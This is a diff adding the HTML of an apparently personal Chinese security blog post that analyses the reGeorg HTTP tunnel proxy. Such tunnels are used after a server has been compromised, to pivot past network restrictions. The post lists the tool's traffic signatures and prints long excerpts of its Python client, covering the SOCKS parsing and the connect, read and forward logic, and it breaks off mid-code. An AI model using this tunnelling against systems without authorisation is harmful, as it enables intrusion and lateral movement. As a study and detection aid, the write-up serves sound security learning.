@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html lang="Zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>C2服务器隧道代理分析 - 汐白的学习档案</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xibai,"> 
+    <meta name="description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,介绍隧道代理技术代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知,"> 
+    <meta name="author" content="Xibai"> 
+    <link rel="alternative" href="atom.xml" title="汐白的学习档案" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="C2服务器隧道代理分析 - 汐白的学习档案"/>
+    <meta name="twitter:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,介绍隧道代理技术代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="汐白的学习档案"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="C2服务器隧道代理分析 - 汐白的学习档案"/>
+    <meta property="og:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,介绍隧道代理技术代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">汐白的学习档案</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://xibai.xyz"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">C2服务器隧道代理分析</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">C2服务器隧道代理分析</h1>
+        <div class="stuff">
+            <span>八月 30, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="隧道代理技术"><a href="#隧道代理技术" class="headerlink" title="隧道代理技术"></a>隧道代理技术</h3><p>代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知代理内部的设备。隧道是一个虚拟的路径，用来使到达隧道入口的数据，穿越原本不方便穿越的网络，到达另一侧出口。</p>
+<p>代理和隧道概念上虽然有区别，但它们的区别不是本质冲突，可以同时实现，也就是隧道代理，即通过隧道进行代理。</p>
+<h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>一般用在服务器已被getshell，想横向渗透但是因为ACL策略较为严格，只允许某个别协议进出（如http协议），无法直接将端口转发或者反弹shell。此时可<strong>利用允许通行的网络协议构建相关代理隧道，使其成为跳板机</strong>。</p>
+<p>这里以工具<code>reGeorg</code>为例进行分析。</p>
+<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><h3 id="工作原理流程"><a href="#工作原理流程" class="headerlink" title="工作原理流程"></a>工作原理流程</h3><p>reGeorg工具便是利用http协议构建了一个简易的代理隧道，从而实现我们的目的。</p>
+<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesprocess.jpg" alt="process"></p>
+<h3 id="流量特征总结"><a href="#流量特征总结" class="headerlink" title="流量特征总结"></a>流量特征总结</h3><ul>
+<li><p>原生代码中客户端与服务端连接时会先发送一个<code>GET</code>请求确认服务端运行是否正常，服务端服务正常则会返回字符串<code>Georg says, &#39;All seems fine</code>告知客户端一切就绪。</p>
+</li>
+<li><p>建立连接之后，客户端仅代理socks的流量，且仅限采用<code>POST</code>请求对服务端进行访问。</p>
+<ul>
+<li>原生代码中，根据此请求对应的功能请求会带有<code>GET</code>和<code>POST</code>参数，形式如：<code>xxx?cmd=xx</code>、<code>X-CMD=xx</code></li>
+<li>原生代码中服务端的响应会根据请求中的内容是否成功实现带有如下关键字:<code>X-STATUS</code>、<code>X-ERROR</code>(仅当遭遇错误失败时返回<code>X-ERROR</code>)</li>
+<li>当<code>cmd|X-CMD</code>对应的功能为<code>connect</code>时，会通过<code>target</code>和<code>port</code>两个<code>GET</code>关键字与<code>X-TARGET</code>和<code>X-PORT</code>两个<code>POST</code>关键字传递要请求的ip和端口</li>
+<li>当<code>cmd|X-CMD</code>对应的功能为<code>reader</code>时，<code>GET</code>关键字为<code>cmd=read</code>，<code>POST</code>关键字为<code>X-CMD=READ</code></li>
+<li>当<code>cmd|X-CMD</code>对应的功能为<code>writer</code>时，<code>GET</code>关键字为<code>cmd=forward</code>，<code>POST</code>关键字为<code>X-CMD=FORWARD</code>，且此时<code>http</code>流量报文中<code>header</code>里 <code>Content-Type</code>属性为且仅为<code>application/octet-stream</code></li>
+</ul>
+</li>
+<li><p>原生代码中未对数据做任何加密或混淆操作，纯明文传输。（意味着无论是对敏感数据的访问，还是payload的发送，任何操作的数据都可以被清晰看到）</p>
+</li>
+</ul>
+<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><ol>
+<li><p>绑定本地指定端口，端口默认情况为<code>8888</code>，起一个<code>SockerServer</code>服务。用来接收需要转发的本地流量</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">servSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">servSock.bind((args.listen_on, args.listen_port))</span><br><span class="line">servSock.listen(<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock, addr_info = servSock.accept()</span><br><span class="line">        sock.settimeout(SOCKTIMEOUT)</span><br><span class="line">        log.debug(<span class="string">&quot;Incomming connection&quot;</span>)</span><br><span class="line">        session(sock, args.url).start()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt, ex:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        log.error(e)</span><br><span class="line">servSock.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将流量代理到指定的本地端口</p>
+</li>
+<li><p>询问服务端状态，查看是否可以正常提供服务。</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">askGeorg</span>(<span class="params">connectString</span>):</span><br><span class="line">    connectString = connectString</span><br><span class="line">    o = urlparse(connectString)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpPort = o.port</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> o.scheme == <span class="string">&quot;https&quot;</span>:</span><br><span class="line">            httpPort = <span class="number">443</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            httpPort = <span class="number">80</span></span><br><span class="line">    httpScheme = o.scheme</span><br><span class="line">    httpHost = o.netloc.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    httpPath = o.path</span><br><span class="line">    <span class="keyword">if</span> o.scheme == <span class="string">&quot;http&quot;</span>:</span><br><span class="line">        httpScheme = urllib3.HTTPConnectionPool</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        httpScheme = urllib3.HTTPSConnectionPool</span><br><span class="line"></span><br><span class="line">    conn = httpScheme(host=httpHost, port=httpPort)</span><br><span class="line">    response = conn.request(<span class="string">&quot;GET&quot;</span>, httpPath)</span><br><span class="line">    <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> BASICCHECKSTRING == response.data.strip():</span><br><span class="line">            log.info(BASICCHECKSTRING)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> askGeorg(args.url):</span><br><span class="line">    log.info(<span class="string">&quot;Georg is not ready, please check url&quot;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>有流量进入后，判断是socks的哪个版本</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">handleSocks</span>(<span class="params">self, sock</span>):</span><br><span class="line">    <span class="comment"># This is where we setup the socks connection</span></span><br><span class="line">    ver = sock.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ver == <span class="string">&quot;\x05&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> self.parseSocks5(sock)</span><br><span class="line">    <span class="keyword">elif</span> ver == <span class="string">&quot;\x04&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> self.parseSocks4(sock)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> self.handleSocks(self.pSocket):</span><br><span class="line">            ···</span><br></pre></td></tr></table></figure>
+<p> 获取请求的<code>targetIP</code>+<code>Port</code></p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parseSocks5</span>(<span class="params">self, sock</span>):</span><br><span class="line">    log.debug(<span class="string">&quot;SocksVersion5 detected&quot;</span>)</span><br><span class="line">    nmethods, methods = (sock.recv(<span class="number">1</span>), sock.recv(<span class="number">1</span>))</span><br><span class="line">    sock.sendall(VER + METHOD)</span><br><span class="line">    ver = sock.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ver == <span class="string">&quot;\x02&quot;</span>:  <span class="comment"># this is a hack for proxychains</span></span><br><span class="line">        ver, cmd, rsv, atyp = (sock.recv(<span class="number">1</span>), sock.recv(<span class="number">1</span>), sock.recv(<span class="number">1</span>), sock.recv(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd, rsv, atyp = (sock.recv(<span class="number">1</span>), sock.recv(<span class="number">1</span>), sock.recv(<span class="number">1</span>))</span><br><span class="line">    target = <span class="literal">None</span></span><br><span class="line">    targetPort = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> atyp == <span class="string">&quot;\x01&quot;</span>:  <span class="comment"># IPv4</span></span><br><span class="line">        <span class="comment"># Reading 6 bytes for the IP and Port</span></span><br><span class="line">        target = sock.recv(<span class="number">4</span>)</span><br><span class="line">        targetPort = sock.recv(<span class="number">2</span>)</span><br><span class="line">        target = <span class="string">&quot;.&quot;</span> .join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> target])</span><br><span class="line">    <span class="keyword">elif</span> atyp == <span class="string">&quot;\x03&quot;</span>:  <span class="comment"># Hostname</span></span><br><span class="line">        targetLen = <span class="built_in">ord</span>(sock.recv(<span class="number">1</span>))  <span class="comment"># hostname length (1 byte)</span></span><br><span class="line">        target = sock.recv(targetLen)</span><br><span class="line">        targetPort = sock.recv(<span class="number">2</span>)</span><br><span class="line">        target = <span class="string">&quot;&quot;</span>.join([unichr(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> target])</span><br><span class="line">    <span class="keyword">elif</span> atyp == <span class="string">&quot;\x04&quot;</span>:  <span class="comment"># IPv6</span></span><br><span class="line">        target = sock.recv(<span class="number">16</span>)</span><br><span class="line">        targetPort = sock.recv(<span class="number">2</span>)</span><br><span class="line">        tmp_addr = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(target) / <span class="number">2</span>):</span><br><span class="line">            tmp_addr.append(unichr(<span class="built_in">ord</span>(target[<span class="number">2</span> * i]) * <span class="number">256</span> + <span class="built_in">ord</span>(target[<span class="number">2</span> * i + <span class="number">1</span>])))</span><br><span class="line">        target = <span class="string">&quot;:&quot;</span>.join(tmp_addr)</span><br><span class="line">    targetPort = <span class="built_in">ord</span>(targetPort[<span class="number">0</span>]) * <span class="number">256</span> + <span class="built_in">ord</span>(targetPort[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&quot;\x02&quot;</span>:  <span class="comment"># BIND</span></span><br><span class="line">        <span class="keyword">raise</span> SocksCmdNotImplemented(<span class="string">&quot;Socks5 - BIND not implemented&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;\x03&quot;</span>:  <span class="comment"># UDP</span></span><br><span class="line">        <span class="keyword">raise</span> SocksCmdNotImplemented(<span class="string">&quot;Socks5 - UDP not implemented&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;\x01&quot;</span>:  <span class="comment"># CONNECT</span></span><br><span class="line">        serverIp = target</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            serverIp = gethostbyname(target)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.error(<span class="string">&quot;oeps&quot;</span>)</span><br><span class="line">        serverIp = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> serverIp.split(<span class="string">&quot;.&quot;</span>)])</span><br><span class="line">        self.cookie = self.setupRemoteSession(target, targetPort)</span><br><span class="line">        <span class="keyword">if</span> self.cookie:</span><br><span class="line">            sock.sendall(VER + SUCCESS + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x01&quot;</span> + serverIp + <span class="built_in">chr</span>(targetPort / <span class="number">256</span>) + <span class="built_in">chr</span>(targetPort % <span class="number">256</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sock.sendall(VER + REFUSED + <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\x01&quot;</span> + serverIp + <span class="built_in">chr</span>(targetPort / <span class="number">256</span>) + <span class="built_in">chr</span>(targetPort % <span class="number">256</span>))</span><br><span class="line">            <span class="keyword">raise</span> RemoteConnectionFailed(<span class="string">&quot;[%s:%d] Remote failed&quot;</span> % (target, targetPort))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> SocksCmdNotImplemented(<span class="string">&quot;Socks5 - Unknown CMD&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用功能<code>CONNECT</code>向服务端发起访问请求。参数是<code>tagetIP</code>+<code>Port</code><br>如果请求成功，会将生成的<code>sessionID</code>保存下来(很重要用来保存整个服务端和Target的Socket会话状态)</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setupRemoteSession</span>(<span class="params">self, target, port</span>):</span><br><span class="line">    headers = &#123;<span class="string">&quot;X-CMD&quot;</span>: <span class="string">&quot;CONNECT&quot;</span>, <span class="string">&quot;X-TARGET&quot;</span>: target, <span class="string">&quot;X-PORT&quot;</span>: port&#125;</span><br><span class="line">    self.target = target</span><br><span class="line">    self.port = port</span><br><span class="line">    cookie = <span class="literal">None</span></span><br><span class="line">    conn = self.httpScheme(host=self.httpHost, port=self.httpPort)</span><br><span class="line">    response = conn.urlopen(<span class="string">&#x27;POST&#x27;</span>, self.connectString + <span class="string">&quot;?cmd=connect&amp;target=%s&amp;port=%d&quot;</span> % (target, port), headers=headers, body=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">        status = response.getheader(<span class="string">&quot;x-status&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            cookie = response.getheader(<span class="string">&quot;set-cookie&quot;</span>)</span><br><span class="line">            log.info(<span class="string">&quot;[%s:%d] HTTP [200]: cookie [%s]&quot;</span> % (self.target, self.port, cookie))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> response.getheader(<span class="string">&quot;X-ERROR&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                log.error(response.getheader(<span class="string">&quot;X-ERROR&quot;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.error(<span class="string">&quot;[%s:%d] HTTP [%d]: [%s]&quot;</span> % (self.target, self.port, response.status, response.getheader(<span class="string">&quot;X-ERROR&quot;</span>)))</span><br><span class="line">        log.error(<span class="string">&quot;[%s:%d] RemoteError: %s&quot;</span> % (self.target, self.port, response.data))</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> cookie</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用功能<code>READ</code>向服务端发起读数据请求,并将读取到的数据发送给相应的本地程序。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reader</span>(<span class="params">self</span>):</span><br><span class="line">    conn = urllib3.PoolManager()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.pSocket:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data = <span class="string">&quot;&quot;</span></span><br><span class="line">            headers = &#123;<span class="string">&quot;X-CMD&quot;</span>: <span class="string">&quot;READ&quot;</span>, <span class="string">&quot;Cookie&quot;</span>: self.cookie, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;Keep-Alive&quot;</span>&#125;</span><br><span class="line">            response = conn.urlopen(<span class="string">&#x27;POST&#x27;</span>, self.connectString + <span class="string">&quot;?cmd=read&quot;</span>, headers=headers, body=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            data = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">                status = response.getheader(<span class="string">&quot;x-status&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">                    <span class="keyword">if</span> response.getheader(<span class="string">&quot;set-cookie&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        cookie = response.getheader(<span class="string">&quot;set-cookie&quot;</span>)</span><br><span class="line">                    data = response.data</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> response.getheader(<span class="string">&quot;server&quot;</span>).find(<span class="string">&quot;Apache-Coyote/1.1&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                            data = data[:<span class="built_in">len</span>(data) - <span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        data = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = <span class="literal">None</span></span><br><span class="line">                    log.error(<span class="string">&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot;</span> % (self.target, self.port, response.status, status, response.getheader(<span class="string">&quot;X-ERROR&quot;</span>)))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                log.error(<span class="string">&quot;[%s:%d] HTTP [%d]: Shutting down&quot;</span> % (self.target, self.port, response.status))</span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># Remote socket closed</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            transferLog.info(<span class="string">&quot;[%s:%d] &lt;&lt;&lt;&lt; [%d]&quot;</span> % (self.target, self.port, <span class="built_in">len</span>(data)))</span><br><span class="line">            self.pSocket.send(data)</span><br><span class="line">        <span class="keyword">except</span> Exception, ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">    self.closeRemoteSession()</span><br><span class="line">    log.debug(<span class="string">&quot;[%s:%d] Closing localsocket&quot;</span> % (self.target, self.port))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.pSocket.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.debug(<span class="string">&quot;[%s:%d] Localsocket already closed&quot;</span> % (self.target, self.port))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>本地程序接收到到读取的数据后进行自己的处理，并将自己解析处理后的响应数据放到<code>http</code>的<code>data</code>里，并将标识符设置成<code>FORWARD</code>，发送给服务端。</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">writer</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">global</span> READBUFSIZE</span><br><span class="line">    conn = urllib3.PoolManager()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.pSocket.settimeout(<span class="number">1</span>)</span><br><span class="line">            data = self.pSocket.recv(READBUFSIZE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            headers = &#123;<span class="string">&quot;X-CMD&quot;</span>: <span class="string">&quot;FORWARD&quot;</span>, <span class="string">&quot;Cookie&quot;</span>: self.cookie, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;Keep-Alive&quot;</span>&#125;</span><br><span class="line">            response = conn.urlopen(<span class="string">&#x27;POST&#x27;</span>, self.connectString + <span class="string">&quot;?cmd=forward&quot;</span>, headers=headers, body=data)</span><br><span class="line">            <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">                status = response.getheader(<span class="string">&quot;x-status&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">                    <span class="keyword">if</span> response.getheader(<span class="string">&quot;set-cookie&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.cookie = response.getheader(<span class="string">&quot;set-cookie&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    log.error(<span class="string">&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot;</span> % (self.target, self.port, response.status, status, response.getheader(<span class="string">&quot;x-error&quot;</span>)))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                log.error(<span class="string">&quot;[%s:%d] HTTP [%d]: Shutting down&quot;</span> % (self.target, self.port, response.status))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            transferLog.info(<span class="string">&quot;[%s:%d] &gt;&gt;&gt;&gt; [%d]&quot;</span> % (self.target, self.port, <span 